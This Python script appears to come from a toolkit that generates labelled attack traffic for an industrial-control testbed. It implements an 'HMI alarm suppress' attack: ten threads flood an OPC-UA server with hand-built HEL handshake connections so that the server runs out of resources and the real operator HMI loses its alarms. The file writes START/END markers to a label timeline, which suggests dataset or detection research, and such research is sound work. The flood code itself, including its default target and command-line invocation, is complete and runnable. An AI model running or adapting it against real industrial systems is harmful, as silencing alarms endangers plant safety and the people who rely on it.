"""
HMI_ALARM_SUPPRESS
Kỹ thuật: Flood OPC-UA connections để exhaust server resources.
          Khi server quá tải, HMI thật mất kết nối -> mất alarm.
Observable: Hàng trăm TCP+HEL connections/s từ IP attacker.

Gọi từ bash:
  python -m attacks_ext.hmi_alarm_suppress \
      --duration 300 --opc-url opc.tcp://192.168.210.31:4840 \
      --session-id bt_s1 --host-id attacker_host \
      --label-file labels/day7_timeline.csv
"""

import socket
import struct
import time
import threading
from attacks_ext.config_ext import base_parser, write_label

THREADS = 10


def build_hello(host, port):
    endpoint = f"opc.tcp://{host}:{port}".encode()
    ep_len = len(endpoint)
    msg_size = 28 + ep_len
    return (
        b'HEL' + b'F' +
        struct.pack('<IIIIII', msg_size, 0, 65536, 65536, 0, 0) +
        struct.pack('<I', ep_len) + endpoint
    )


def flood_worker(host, port, hello, results, lock, end_time):
    while time.time() < end_time:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect((host, port))
            s.send(hello)
            time.sleep(0.05)
            s.close()
            with lock:
                results["success"] += 1
        except Exception:
            with lock:
                results["failed"] += 1


def run(args):
    label_prefix = "HMI_ALARM_SUPPRESS"

    url = args.opc_url.replace("opc.tcp://", "")
    parts = url.split(":")
    host = parts[0]
    port = int(parts[1]) if len(parts) > 1 else 4840

    write_label(args.label_file, label_prefix, "START",
                args.session_id, args.host_id,
                episode_id=args.episode_id, day=args.day,
                note=f"dur={args.duration}s target={host}:{port} threads={THREADS}")

    results = {"success": 0, "failed": 0}
    lock = threading.Lock()
    hello = build_hello(host, port)
    end_time = time.time() + args.duration

    try:
        print(f"[*] HMI_ALARM_SUPPRESS -> {host}:{port}")
        print(f"[*] {THREADS} threads, duration {args.duration}s")
        print(f"[*] Flood OPC-UA HEL -> resource exhaust -> HMI mat alarm")

        threads = []
        for _ in range(THREADS):
            t = threading.Thread(target=flood_worker,
                                 args=(host, port, hello, results, lock, end_time))
            t.daemon = True
            threads.append(t)
            t.start()

        start = time.time()
        while time.time() < end_time:
            time.sleep(5)
            elapsed = int(time.time() - start)
            print(f"  [{elapsed:3d}s] sent={results['success']} failed={results['failed']}")

        for t in threads:
            t.join(timeout=3)

        print(f"[*] Done: {results['success']} sent, {results['failed']} failed")

    except Exception as e:
        print(f"[ERR] {e}")
    finally:
        write_label(args.label_file, label_prefix, "END",
                    args.session_id, args.host_id,
                    episode_id=args.episode_id, day=args.day,
                    note=f"sent={results['success']} failed={results['failed']}")


def main():
    p = base_parser("HMI Alarm Suppress (OPC-UA Resource Exhaust)")
    p.add_argument("--opc-url", default="opc.tcp://192.168.210.31:4840")
    p.add_argument("--opc-username", default="")
    p.add_argument("--opc-password", default="")
    args = p.parse_args()
    run(args)


if __name__ == "__main__":
    main()
